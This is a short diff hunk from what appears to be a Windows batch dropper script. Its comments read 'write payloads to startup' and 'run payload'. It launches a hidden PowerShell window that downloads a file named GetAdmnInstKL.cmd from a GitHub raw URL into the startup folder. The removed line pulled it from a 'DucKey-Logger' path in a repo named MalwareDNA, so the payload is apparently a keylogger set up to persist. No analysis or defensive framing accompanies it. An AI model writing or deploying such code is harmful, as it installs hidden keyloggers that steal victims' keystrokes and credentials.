@@ -10,7 +10,7 @@ cd %STARTUP%
 @REM TODO: build out stage two
 
 @REM write payloads to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/MalwareDNA/main/rubberducky/DucKey-Logger/p.ps1 -OutFile GetAdmnInstKL.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention/main/GetAdmnInstKL.cmd -OutFile GetAdmnInstKL.cmd"
 
 
 @REM run payload
